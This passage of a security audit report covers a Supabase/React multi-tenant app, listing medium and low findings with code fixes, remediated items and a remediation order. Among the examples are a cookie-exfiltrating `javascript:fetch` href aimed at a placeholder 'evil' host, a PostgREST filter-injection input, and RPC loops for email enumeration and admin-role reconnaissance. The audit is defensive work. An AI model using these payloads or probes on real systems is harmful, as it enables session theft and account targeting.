```sql
DROP POLICY IF EXISTS "sys_admin_full_access" ON support_tickets;
CREATE POLICY "sys_admin_full_access" ON support_tickets
    FOR ALL USING (public.is_sys_admin()) WITH CHECK (public.is_sys_admin());

DROP POLICY IF EXISTS "org_admin_tenant_access" ON support_tickets;
CREATE POLICY "org_admin_tenant_access" ON support_tickets
    FOR SELECT USING (public.is_org_admin_of_tenant(tenant_id));
```

Apply the same substitution to `notes`, `document_catalog`, `client_users`,
`client_contacts`, `contacts`, and `requirements` (and fold in the `WITH CHECK`
from **H7** while you are editing them).

---

### M2 — PostgREST filter injection via unescaped user input in `.or()`

**Files:**
- `src/components/shared/GlobalSearch.tsx:126,137`
- `src/services/api/notifications.ts:377-379, 523-525`

```tsx
// GlobalSearch.tsx:103-104 — escapes ilike wildcards only
const escapedSearch = searchText.replace(/[%_]/g, '\\$&')
const pattern = `%${escapedSearch}%`
...
// GlobalSearch.tsx:126
.or(`first_name.ilike.${pattern},last_name.ilike.${pattern},email.ilike.${pattern}`)
// GlobalSearch.tsx:137
.or(`lead_name.ilike.${pattern},email.ilike.${pattern}`)
```

```ts
// notifications.ts:377 — no escaping at all
query = query.or(`recipient_email.ilike.%${filters.search}%,subject.ilike.%${filters.search}%`)
```

**What's wrong.** `.or()` takes a **PostgREST filter expression**, not a bound
parameter. The escaping at `GlobalSearch.tsx:103` covers `%` and `_` (the `ilike`
wildcards) but not `,` `.` `(` `)` — the delimiters of the filter grammar itself.
Typing `foo,id.gt.0` into the search box injects an extra disjunct, replacing the
intended column predicate:

```
first_name.ilike.%foo,id.gt.0%,last_name.ilike.…
         →  first_name.ilike.%foo  OR  id.gt.0%  OR  …
```

`notifications.ts` interpolates with no escaping whatsoever.

**Scope, honestly stated:** this does **not** breach tenant isolation. The
`.eq('tenant_id', currentTenant.id)` at `GlobalSearch.tsx:113` is a separate `AND`
term, and RLS applies underneath regardless. The realistic impact is bypassing the
intended column filter inside the caller's own tenant (returning rows the UI meant
to exclude) and error-based column/type enumeration from PostgREST's messages — plus
a straightforward way to make the query error out. Worth fixing properly rather than
treating as cosmetic.

**Fix.** PostgREST allows double-quoting a filter value; quote it and strip quotes
and backslashes from the input:

```ts
function orValue(raw: string): string {
  const cleaned = raw.replace(/[\\"(),]/g, ' ').replace(/[%_]/g, '\\$&')
  return `"%${cleaned}%"`
}
const v = orValue(searchText)
query = supabase.from(table).select(...)
  .eq('tenant_id', currentTenant.id)
  .is('deleted_at', null)
  .or(`first_name.ilike.${v},last_name.ilike.${v},email.ilike.${v}`)
  .limit(5)
```

Apply the same helper at `notifications.ts:377` and `:523`. Cleaner still for
multi-column search: add a `tsvector` column plus GIN index and use
`.textSearch('search_vector', term, { type: 'websearch' })`, which is parameterised.

---

### M3 — Admin Edge Functions: wildcard CORS and no rate limiting

**Files:**
- `supabase/functions/admin-reset-password/index.ts:7-10`
- `supabase/functions/admin-create-user/index.ts:8-11`
- `supabase/functions/run-lead-automation/index.ts:7-8`

```ts
const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}
```

**What's wrong.** Credit where due: `admin-reset-password` and `admin-create-user`
*do* authenticate and authorize correctly — they verify the JWT via
`userClient.auth.getUser()` and gate on `get_user_highest_role`
(`admin-reset-password/index.ts:52-78`, `admin-create-user/index.ts:55-81`). The
residual issues are narrower:

- `Access-Control-Allow-Origin: *` lets any site script these endpoints with a
  token it has already obtained. Because auth is a bearer header rather than a
  cookie, this is not CSRF, but it removes a useful containment layer and widens the
  blast radius of any XSS (**H2**) to "any page on the internet can drive admin
  actions with a stolen token".
- No rate limiting on either function. `admin-reset-password` is an unbounded
  password-reset oracle for a compromised `sys_admin` token;
  `admin-create-user` is an unbounded user-creation endpoint for an `org_admin` token.
- `admin-create-user` does not validate `email` with a real email check (only
  `typeof === 'string'`, line 88) nor enforce password complexity beyond
  `length >= 8` (line 102).
- Both are deployed with `--no-verify-jwt` per `CLAUDE.md`, so the in-function check
  is the *only* gate — correct today, but one refactor away from being removed.

**Fix.** Pin the origin and add a per-caller budget:

```ts
const ALLOWED_ORIGINS = new Set([
  'https://lineup.yourdomain.com',
  'http://localhost:5173',
])
function cors(req: Request) {
  const origin = req.headers.get('Origin') ?? ''
  return {
    'Access-Control-Allow-Origin': ALLOWED_ORIGINS.has(origin) ? origin : 'null',
    'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
    'Vary': 'Origin',
  }
}
```

Add a `check_rate_limit`-style counter keyed on `callerUser.id` (e.g. 10
admin-resets/hour), validate email with a real regex, and raise the password floor to
12 characters with a complexity or breach check.

---

### M4 — Admin login gate reads a column that does not exist

**File:** `src/pages/admin/AdminLoginPage.tsx:59-70`

```tsx
const profile = await authApi.getUserProfile(user.id)
setProfile(profile)

// Verify this is a sys_admin
if (!profile || profile.role !== 'sys_admin') {
  toast({ title: 'Access Denied', ... })
  await authApi.signOut()
  ...
}
setRole('sys_admin')
```

**What's wrong.** `user_profiles` has **no `role` column** — `supabase/schema.sql`
defines it as `(id, user_id, full_name, avatar_url, created_at, updated_at)` and no
migration adds `role` (`059_user_profiles_split_name.sql` adds only
`first_name`/`last_name`). `UserProfile.role` is declared optional in
`src/types/database.ts`, so TypeScript does not catch it. `profile.role` is always
`undefined`, so the comparison always fails.

This currently fails *closed*, which is why it is Medium and not Critical. But the
check is load-bearing in appearance only, and it creates a latent escalation: if
anyone later adds a `role` column to `user_profiles`, `user_profiles_update_v2`
(`031:77`, no `WITH CHECK`, `USING (auth.uid() = user_id ...)`) lets a user write
their own profile row — including that column — and this gate would then accept
self-asserted `sys_admin`.

**Fix.** Authorize against `tenant_users` via the existing RPC, which is the single
source of truth:

```tsx
const role = await authApi.getUserHighestRole(user.id)   // rpc get_user_highest_role
if (role !== 'sys_admin') {
  toast({ title: 'Access Denied', description: 'You do not have admin privileges.', variant: 'destructive' })
  await authApi.signOut()
  setUser(null); setProfile(null)
  return
}
setRole('sys_admin')
```

Also drop the optional `role?: UserRole` from the `UserProfile` interface
(`src/types/database.ts`) so the mistake cannot recur, and never add a
user-writable `role` column to `user_profiles`.

---

### M5 — Credentials copied to clipboard with no auto-clear, and no reveal/copy audit trail

**Files:**
- `src/pages/passwords/PasswordDetailPage.tsx:161`
- `src/pages/passwords/PasswordsPage.tsx:65`
- `src/pages/settings/TeamPage.tsx:187`
- `src/pages/contacts/ContactDetailPage.tsx:153`
- `src/pages/admin/AdminTenantDetailPage.tsx:171,181`

```tsx
navigator.clipboard.writeText(password.password)
toast({ description: 'Password copied to clipboard.' })
```

**What's wrong.** Six call sites write a credential to the OS clipboard and never
clear it. The clipboard is shared across every application and, with clipboard
sync (Windows Cloud Clipboard, macOS Universal Clipboard, Android↔ChromeOS), often
across devices; any page the user subsequently visits that reads the clipboard on
paste, or any clipboard-history tool, retains the secret indefinitely. There is also
no record of the copy — see **C2** on the missing `password_access_log`. The two
sites in `AdminTenantDetailPage.tsx` copy admin-reset passwords, the highest-value
secrets in the system.

**Fix.** Centralise on a helper that clears after a timeout and records the access:

```ts
// src/lib/clipboard.ts
export async function copySecret(value: string, onAudit?: () => void) {
  await navigator.clipboard.writeText(value)
  onAudit?.()
  window.setTimeout(() => {
    navigator.clipboard.readText()
      .then(cur => { if (cur === value) return navigator.clipboard.writeText('') })
      .catch(() => { /* permission denied — nothing to do */ })
  }, 30_000)
}
```

Use it at all six sites, surface the 30-second window in the toast
("Copied — clipboard clears in 30s"), and call the reveal RPC from **C2** as the
`onAudit` callback so every copy lands in `password_access_log`. Prefer a
masked-reveal-on-hold control over copy-to-clipboard where the user only needs to
read the value.

---

### M6 — `check_email_exists` enables platform-wide account enumeration

**File:** `supabase/migrations/035_check_email_exists.sql:7-23`

```sql
CREATE OR REPLACE FUNCTION public.check_email_exists(p_email TEXT)
RETURNS BOOLEAN LANGUAGE plpgsql SECURITY DEFINER STABLE AS $$
BEGIN
    RETURN EXISTS (SELECT 1 FROM auth.users WHERE LOWER(email) = LOWER(p_email));
END; $$;

GRANT EXECUTE ON FUNCTION public.check_email_exists(TEXT) TO authenticated;
```

**What's wrong.** Any authenticated user — including a single `client_user` with
portal-only access — can probe `auth.users` for arbitrary addresses, unlimited and
unlogged:

```js
for (const email of candidateList) {
  const { data } = await supabase.rpc('check_email_exists', { p_email: email })
}
```

That is a membership oracle over your entire customer base, useful for
credential-stuffing target selection and for confirming which of a competitor's
staff use the platform. There is no tenant scoping (the function reads global
`auth.users`) and no rate limit.

**Fix.** The function exists to pre-check email collisions during admin user
creation, so restrict it to callers who can actually create users and move it behind
the server:

```sql
CREATE OR REPLACE FUNCTION public.check_email_exists(p_email TEXT)
RETURNS BOOLEAN LANGUAGE plpgsql SECURITY DEFINER STABLE
SET search_path = public, pg_temp AS $$
BEGIN
  IF NOT (public.is_sys_admin() OR public.is_org_admin()) THEN
    RAISE EXCEPTION 'insufficient_privilege';
  END IF;
  RETURN EXISTS (SELECT 1 FROM auth.users WHERE LOWER(email) = LOWER(p_email));
END; $$;

REVOKE EXECUTE ON FUNCTION public.check_email_exists(TEXT) FROM authenticated;
GRANT EXECUTE ON FUNCTION public.check_email_exists(TEXT) TO authenticated; -- gate is now internal
```

Better: delete the RPC and let `admin-create-user` report the existing
`409 / 'already been registered'` path it already implements
(`admin-create-user/index.ts:134-139`), which requires `org_admin`+ to reach.

---

### M7 — User-controlled `href` with no scheme allowlist

**Files:**
- `src/pages/passwords/PasswordsPage.tsx:220` — `href={password.url}`
- `src/pages/competitors/CompetitorsPage.tsx:219` — `href={competitor.website}`
- `src/pages/competitors/CompetitorDetailPage.tsx:253` — `href={url}`
- `src/pages/clients/ClientDetailPage.tsx:1656` — `href={competitor.website}`
- `src/pages/tickets/MyTicketsPage.tsx:226` — `href={selectedTicket.page_url}`
- `src/pages/admin/SupportDashboardPage.tsx:415` — `href={selectedTicket.page_url}`

**What's wrong.** These render URLs stored by other tenant members with no scheme
validation. A stored `javascript:fetch('//evil/?'+document.cookie)` or a
`data:text/html,...` value becomes a clickable link. React logs a warning for
`javascript:` hrefs but does not reliably block them, and `data:`/`vbscript:` are not
covered at all. `SupportDashboardPage.tsx:415` is the sharpest case: a
`sys_admin` reviewing tickets clicks a `page_url` submitted by an arbitrary tenant
user.

Credit where due: all six sites **do** carry `rel="noopener noreferrer"` alongside
`target="_blank"` — verified individually. The gap is scheme validation only.

**Fix.** One shared helper, used at every site:

```ts
// src/lib/safeUrl.ts
export function safeHttpUrl(raw?: string | null): string | undefined {
  if (!raw) return undefined
  try {
    const u = new URL(raw, window.location.origin)
    return u.protocol === 'https:' || u.protocol === 'http:' ? u.toString() : undefined
  } catch { return undefined }
}
```

```tsx
{safeHttpUrl(password.url) ? (
  <a href={safeHttpUrl(password.url)} target="_blank" rel="noopener noreferrer">…</a>
) : <span className="text-muted-foreground">—</span>}
```

Also validate on write with Zod (`z.string().url()` plus a protocol refinement) in
the competitor/password/ticket forms, and note that the CSP from **H3**
(`object-src 'none'`, `base-uri 'none'`) narrows the fallout.

---

### M8 — `user_profiles` UPDATE policies have no `WITH CHECK`

**Files:**
- `supabase/migrations/031_fix_user_creation_rls.sql:77-91`
- `supabase/migrations/018_sysadmin_rls_and_tenant_deletion.sql:61`

```sql
CREATE POLICY "user_profiles_update_v2" ON user_profiles
    FOR UPDATE
    USING (
        auth.uid() = user_id
        OR public.is_sys_admin()
        OR user_id IN (
            SELECT tu2.user_id FROM tenant_users tu1
            JOIN tenant_users tu2 ON tu1.tenant_id = tu2.tenant_id
            WHERE tu1.user_id = auth.uid()
              AND tu1.role IN ('org_admin') AND tu1.status = 'active'
        )
    );
```

**What's wrong.** Same `USING`-only shape as **H7**, on the identity table. A user
passes `USING` on their own profile and may then rewrite `user_id` to point the row
at a different `auth.users` id — hijacking or corrupting another user's profile
record, which is what `created_by`/`updated_by` foreign keys across the schema
reference. An `org_admin` can do the same for any profile in their tenant,
including re-pointing it at a user in another tenant. This is also the mechanism
that would make **M4** exploitable if a `role` column were ever added here.

**Fix.**

```sql
DROP POLICY IF EXISTS "user_profiles_update_v2" ON user_profiles;
CREATE POLICY "user_profiles_update_v2" ON user_profiles
    FOR UPDATE
    USING (
        auth.uid() = user_id OR public.is_sys_admin()
        OR public.is_org_admin_of_same_tenant(user_id)
    )
    WITH CHECK (
        auth.uid() = user_id OR public.is_sys_admin()
        OR public.is_org_admin_of_same_tenant(user_id)
    );
```

Plus a `BEFORE UPDATE` trigger raising on `NEW.user_id <> OLD.user_id`, since
`user_id` should be immutable for the life of the row. Drop the superseded
`user_profiles_update_policy` from `018:61` so only one policy governs the table.

---

### M9 — `get_user_highest_role` accepts an arbitrary `p_user_id` with no caller check

**File:** `supabase/migrations/010_fix_schema_and_constraints.sql:110-134`

```sql
CREATE OR REPLACE FUNCTION get_user_highest_role(p_user_id UUID)
RETURNS TEXT LANGUAGE plpgsql SECURITY DEFINER AS $$
DECLARE v_role TEXT;
BEGIN
  SELECT role INTO v_role FROM tenant_users
  WHERE user_id = p_user_id AND status = 'active'
  ORDER BY CASE role WHEN 'sys_admin' THEN 1 WHEN 'org_admin' THEN 2 ... END
  LIMIT 1;
  RETURN v_role;
END; $$;
```

**What's wrong.** `SECURITY DEFINER` (so RLS on `tenant_users` is bypassed) with a
caller-supplied `p_user_id` and no check that it equals `auth.uid()`. Any
authenticated user can read any other user's highest role across all tenants —
a reconnaissance primitive for locating `sys_admin` accounts to target:

```js
await supabase.rpc('get_user_highest_role', { p_user_id: someOtherUserId })
```

Note this function is also the authorization gate inside both admin Edge Functions
(`admin-reset-password/index.ts:61`, `admin-create-user/index.ts:64`). They pass
`callerUser.id`, so they are used correctly — but the function is simultaneously an
unrestricted lookup and a security control, which is a poor split of
responsibilities. It also lacks `SET search_path` (**H1**).

**Fix.** Default to the caller and reject anything else unless privileged:

```sql
CREATE OR REPLACE FUNCTION public.get_user_highest_role(p_user_id UUID DEFAULT NULL)
RETURNS TEXT LANGUAGE plpgsql SECURITY DEFINER STABLE
SET search_path = public, pg_temp AS $$
DECLARE v_target UUID := COALESCE(p_user_id, auth.uid()); v_role TEXT;
BEGIN
  IF v_target <> auth.uid() AND NOT public.is_sys_admin() THEN
    RAISE EXCEPTION 'insufficient_privilege';
  END IF;
  SELECT role INTO v_role FROM public.tenant_users
  WHERE user_id = v_target AND status = 'active'
  ORDER BY CASE role WHEN 'sys_admin' THEN 1 WHEN 'org_admin' THEN 2
                     WHEN 'org_user' THEN 3 WHEN 'client_user' THEN 4 ELSE 5 END
  LIMIT 1;
  RETURN v_role;
END; $$;
```

Callers already pass their own id (`src/hooks/useUserRole.ts:13`,
`src/services/api/auth.ts:296`), so this is backward compatible.

---

### M10 — Signup and password-reset rate limits are enforced only in the browser

**File:** `src/services/api/auth.ts:34-39, 119-125`

```ts
signUp: async ({ email, password, fullName }: SignUpData) => {
  // Rate limiting: 3 signups per minute
  const rateLimitResult = checkRateLimit('auth:signup', RATE_LIMITS.signup)
  ...
resetPassword: async (email: string) => {
  // Rate limiting: 3 password resets per 15 minutes
  const rateLimitResult = checkRateLimit(`auth:reset:${email}`, RATE_LIMITS.passwordReset)
```

**What's wrong.** `checkRateLimit` is `src/lib/security.ts`, an in-memory/browser
counter. It is trivially bypassed by clearing state, opening a new tab, or calling
`/auth/v1/signup` and `/auth/v1/recover` directly with the public anon key. Note the
*login* path was deliberately upgraded to a server-side check
(`auth.ts:67-88`) — signup and reset were not. Result: unbounded account creation
(tenant/table pollution) and unbounded reset-email sending to a chosen address
(mail-bombing a specific user, plus Supabase email-quota exhaustion). Supabase's
platform limits are the only real control, and they are not configured in-repo.

**Fix.** Keep the client check as UX, but add the real limit server-side. Raise the
Supabase Auth rate limits deliberately in the dashboard (or `config.toml`, which this
repo does not currently have — see **L7**), and for signup specifically, route
through an Edge Function that applies a `check_rate_limit`-backed counter keyed on
the request IP:

```ts
// supabase/functions/public-signup/index.ts
const ip = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ?? 'unknown'
const { data: rl } = await admin.rpc('check_rate_limit', {
  p_email: ip, p_action_type: 'signup',
})
if (!rl?.allowed) return json(429, { error: 'Too many attempts' })
```

Add a CAPTCHA (Supabase supports hCaptcha/Turnstile natively) on the signup and
forgot-password forms — the most effective single control here.

---

## 4. Low

### L1 — Portal login hardcodes the role in client state

**File:** `src/pages/portal/PortalLoginPage.tsx:58-59`

```tsx
// For portal, we assume client_user role
setRole('client_user')
```

Any user signing in through `/portal/login` is stamped `client_user` in the Zustand
store regardless of their real role. Impact is limited — `authStore` does not
persist `role` (`src/stores/authStore.ts:61-64` partializes to `isAuthenticated`
only), and both guards resolve the role from the server via `useUserRole()`
(`AdminGuard.tsx:24`, `AuthGuard.tsx:24`), so this cannot grant access. It does
produce incorrect UI for a non-portal user who lands there.

**Fix.** Use the real role and reject non-portal users, mirroring the corrected
`AdminLoginPage` from **M4**:

```tsx
const role = await authApi.getUserHighestRole(user.id)
if (role !== 'client_user') {
  await authApi.signOut()
  toast({ title: 'Use the main sign-in page', variant: 'destructive' })
  return
}
setRole(role)
```

---

### L2 — Signed URL TTL is 1 hour

**File:** `src/services/api/documents.ts:428, 463`

```ts
.createSignedUrl(fileUrl, 3600)
```

A 1-hour bearer URL that needs no authentication. Once it reaches a chat message,
browser history, a `Referer` header (see **H3**), or a proxy log, anyone can fetch
the document for the remainder of the window.

**Fix.** Drop to the shortest workable window and mint on demand at click time
rather than on list render:

```ts
.createSignedUrl(fileUrl, 120, { download: true })
```

`download: true` also mitigates the inline-rendering half of **H8**.

---

### L3 — Upload filename sanitization only collapses whitespace

**File:** `src/services/api/documents.ts:276-277`

```ts
const sanitizedName = file.name.replace(/\s+/g, '_')
const fileName = `${tenantId}/${Date.now()}_${sanitizedName}`
```

Only whitespace is replaced. A filename containing `/` creates unintended nested
keys, and leading dots or control characters survive into the object key.

**Not** path traversal: Supabase Storage keys are opaque strings rather than
filesystem paths, and `validate_storage_tenant_path` (`029:47`) pins the first
segment to the tenant UUID, so `../` cannot escape the tenant prefix. Logged as Low
for hygiene and for the H8 extension check to rest on.

**Fix.** Covered by the **H8** snippet:
`file.name.replace(/[^\w.\-]+/g, '_').replace(/^\.+/, '')`.

---

### L4 — Tenant identifiers logged to the browser console

**File:** `src/components/guards/TenantGuard.tsx:15-20, 22, 39`

```tsx
console.log('[TenantGuard] State:', {
  isLoading, tenantsCount: tenants.length, currentTenantId: currentTenant?.id || null,
})
...
console.log('[TenantGuard] Tenant ready, rendering children with tenant:', currentTenant.id)
```

Tenant UUIDs are written to the console on every guard render in production. Minor
information disclosure, and noise that makes real errors harder to spot. (Checked
more broadly: 23 `console.log` calls in `src/`, and none log passwords, tokens, or
session material — `usePasswords.ts:71,92,112` log only the error object.)

**Fix.** Delete the three statements, or gate them:
`if (import.meta.env.DEV) console.log(...)`. Add
`esbuild: { drop: ['console', 'debugger'] }` to `vite.config.ts` for production
builds.

---

### L5 — `.env` was committed historically (anon key and project URL only)

**Evidence:**
```
7b47b4e feat: setup supabase environment variables      (added .env)
3793d9c chore: add .env to gitignore and remove from tracking
```

`git show 7b47b4e:.env` contains only `VITE_SUPABASE_URL` and
`VITE_SUPABASE_ANON_KEY`. Both are designed to be public and already ship in the
client bundle, so **exposure impact is negligible** — flagged for completeness and
because the history remains rewritable only with a force-push.

Current hygiene is good: `.env` is untracked, `.gitignore:1-4` covers `.env` and
`.env.*`, no `SUPABASE_SERVICE_ROLE_KEY` appears anywhere in `src/`
(only the four comments at `src/services/api/auth.ts:248,261,325` and
`src/services/api/tenants.ts:198` referring to the Edge Function pattern), and the
live `.env` holds no service-role key. One residual: `.env.example` is tracked
despite matching `.gitignore`'s `.env.*` (it predates the rule) — harmless, since it
contains only placeholders, but `git check-ignore` will mislead.

**Fix.** No urgent action. Optionally rotate the anon key during the next planned
credential rotation, add an explicit `!.env.example` negation to `.gitignore` so the
tracked file matches the rules, and add a secret scanner (`gitleaks`,
`trufflehog`) to CI to catch a future service-role key before it lands.

---

### L6 — RLS helper functions are granted to `anon`

**File:** `supabase/migrations/044_ensure_rls_functions_exist.sql:28, 51, 79`

```sql
GRANT EXECUTE ON FUNCTION public.get_user_tenant_ids() TO anon;
GRANT EXECUTE ON FUNCTION public.is_sys_admin() TO anon;
GRANT EXECUTE ON FUNCTION public.user_has_role_in_tenant(UUID, text[]) TO anon;
```

All three return empty/false when `auth.uid()` is `NULL`, so an anonymous caller
learns nothing today. The grants are nonetheless unnecessary — these are RLS
internals, not public API — and they widen the reachable surface for **H1**
(an anon caller can invoke a `search_path`-shadowable `SECURITY DEFINER` function).

**Fix.**

```sql
REVOKE EXECUTE ON FUNCTION public.get_user_tenant_ids() FROM anon;
REVOKE EXECUTE ON FUNCTION public.is_sys_admin() FROM anon;
REVOKE EXECUTE ON FUNCTION public.user_has_role_in_tenant(UUID, text[]) FROM anon;
```

RLS policies evaluate these as the policy owner, not the caller, so no policy breaks.

---

### L7 — No `supabase/config.toml`: platform auth settings are not in version control

**Evidence:** `find supabase -name config.toml` → no result; `supabase/` contains
`migrations/`, `functions/`, and loose `.sql` helper scripts only.

Auth rate limits, JWT/refresh-token lifetimes, password policy, email confirmation,
and per-function `verify_jwt` all live only in the Supabase dashboard. They are
invisible to review, undiffable, and silently lost when recreating the project —
which matters directly for **M10** (rate limits) and **M3** (`--no-verify-jwt` is
currently a hand-typed CLI flag documented in `CLAUDE.md`).

**Fix.** Run `npx supabase init` to generate `config.toml`, commit it, and pin the
security-relevant settings:

```toml
[auth]
jwt_expiry = 3600
enable_refresh_token_rotation = true
refresh_token_reuse_interval = 10
minimum_password_length = 12
password_requirements = "lower_upper_letters_digits_symbols"

[auth.rate_limit]
sign_in_sign_ups = 10
token_refresh = 50
email_sent = 10

[auth.captcha]
enabled = true
provider = "hcaptcha"

[functions.admin-reset-password]
verify_jwt = false
[functions.send-notification]
verify_jwt = true
```

Move the loose `supabase/fix-*.sql` / `refresh-schema-cache.sql` scripts into
numbered migrations or a `scripts/` directory so the applied-schema state is
unambiguous.

---

## 5. Already Remediated (uncommitted working tree)

These were open at commit `d19a892` and are addressed by in-flight changes. Verify
they are committed and deployed, and keep them in regression tests.

| Item | Where | Status |
|---|---|---|
| Sessions never expired (`persistSession` + `autoRefreshToken`, no idle/absolute cap) | `src/lib/sessionPolicy.ts`, `src/hooks/useSessionTimeout.ts`, `src/components/providers/SessionTimeoutProvider.tsx`, `supabase/migrations/068_session_security.sql` | Fixed — 30-min idle + 12-h absolute, cross-tab coordinated, tenant-configurable. Provider is wired at `src/App.tsx:93-199`. |
| Refresh token survived sign-out (local-scope `signOut`) | `src/services/api/auth.ts:113-117` | Fixed — `signOut({ scope: 'global' })` revokes server-side. |
| No guard against a service-role key in the client bundle | `src/services/supabase.ts:19-37` | Fixed — `assertNotServiceRoleKey` decodes the JWT and throws on `role === 'service_role'`. |
| `returnTo` open-redirect hardening | `src/hooks/useAuth.ts:20-29` | Fixed — rejects `//`, backslashes, control characters, `/http`; `decodeURIComponent` wrapped in try/catch. |
| Implicit OAuth flow on email links | `src/services/supabase.ts:46` | Fixed — `flowType: 'pkce'`. |
| No authentication audit trail | `src/services/api/sessionSecurity.ts`, `src/hooks/useAuth.ts:63-67, 96-102` | Fixed — `login_success` / `logout` events recorded. |

Two caveats on the new code:

- Tokens still live in `localStorage` (the Supabase default, retained deliberately —
  see the `storageKey` comment at `src/services/supabase.ts:47-49`). The idle timeout
  shortens the window but does not close **H2**'s token-theft path; the CSP in **H3**
  and sanitization in **H2** remain the real mitigations.
- `src/lib/sessionPolicy.ts` coordinates through `localStorage`, so the idle timeout
  is advisory client-side state. An attacker holding a stolen refresh token ignores
  it. `signOut({ scope: 'global' })` plus a short `jwt_expiry` (**L7**) is what makes
  the limit real.

---

## 6. Verified Clean (no finding)

Checked and found correct — recorded so these are not re-audited:

- **RLS coverage is complete.** All 27 tables created in `migrations/` and all 11 in
  `schema.sql` have `ENABLE ROW LEVEL SECURITY`; no `DISABLE ROW LEVEL SECURITY`
  anywhere. The only `USING (TRUE)` policy is
  `016_server_side_rate_limiting.sql:221` on `rate_limit_config`, which holds
  non-sensitive limiter settings and is intentionally world-readable.
- **`target="_blank"` hygiene.** All 7 occurrences carry
  `rel="noopener noreferrer"` — verified individually, not by grep count.
  (Scheme validation is still missing: **M7**.)
- **No dangerous dynamic evaluation.** No `eval(`, no `new Function(`, no
  `.innerHTML` assignment in `src/`. The only HTML sinks are the two
  `dangerouslySetInnerHTML` uses in **H2**.
- **No secrets logged.** None of the 23 `console.log` calls in `src/` emit
  passwords, tokens, or session material.
- **`admin-reset-password` / `admin-create-user` authorize correctly.** JWT verified
  via `auth.getUser()`, role gated on `get_user_highest_role`, service-role client
  instantiated only after the check passes, and `admin-reset-password` additionally
  blocks self-reset (`index.ts:107-112`). Residual issues are CORS and rate limiting
  only (**M3**).
- **Auth/tenant stores do not persist sensitive state.**
  `src/stores/authStore.ts:61-64` persists only `isAuthenticated`;
  `src/stores/tenantStore.ts:53` partializes to `{}` with an explicit comment about
  cross-user leakage. `queryClient.clear()` runs on both sign-in and sign-out
  (`src/hooks/useAuth.ts:54, 109`).
- **No `getPublicUrl` usage.** Document access goes exclusively through
  `createSignedUrl`, and the `documents` bucket is intended to be private
  (`supabase/storage-setup.sql:14`) — confirm `storage.buckets.public = false` in
  production as part of the **H8** fix.
- **No service-role key referenced client-side.** The only `SERVICE_ROLE` mentions in
  `src/` are explanatory comments (`src/services/api/auth.ts:248,261,325`,
  `src/services/api/tenants.ts:198`).
- **Core tenant policies use `status = 'active'` helpers.** The `043`/`044` policy
  families correctly route through `get_user_tenant_ids()` /
  `user_has_role_in_tenant()` / `is_sys_admin()`, all of which filter on `status`.
  The exceptions are enumerated in **M1**.

---

## 7. Suggested Remediation Order

1. **C1** — `tenant_users` `WITH CHECK`. One migration, closes the escalation path.
   Audit production `tenant_users` for unexpected `sys_admin` rows first.
2. **C3, C4** — add authenticate-then-authorize to `send-notification` and
   `run-lead-automation`. Two Edge Function deploys; these are internet-reachable now.
3. **H4** — revoke `record_login_attempt` from `anon`, drop the `DELETE` branch.
4. **H1** — `SET search_path` on all 49 `SECURITY DEFINER` functions, and
   `REVOKE CREATE ON SCHEMA public`.
5. **H2 + H3** — DOMPurify on both sinks, and the `vercel.json` headers block.
   Deploy together; the CSP backstops the sanitizer.
6. **H6, H7, M1, M8** — one consolidated RLS migration: add every missing
   `WITH CHECK`, swap inline role `EXISTS` for the `status`-aware helpers, and add
   the `tenant_id`-immutability trigger.
7. **H5, H8** — webhook shared secret; upload allowlist plus bucket limits.
8. **C2** — password-vault envelope encryption and `password_access_log`. Largest
   change; schedule deliberately rather than rushing it.
9. **M2–M7, M9, M10** then **L1–L7**.

Add to CI alongside the fixes: a secret scanner, a check that fails on any
`FOR UPDATE` policy without `WITH CHECK`, a check that fails on any
`SECURITY DEFINER` function without `SET search_path`, and a grep gate on new
`dangerouslySetInnerHTML`.
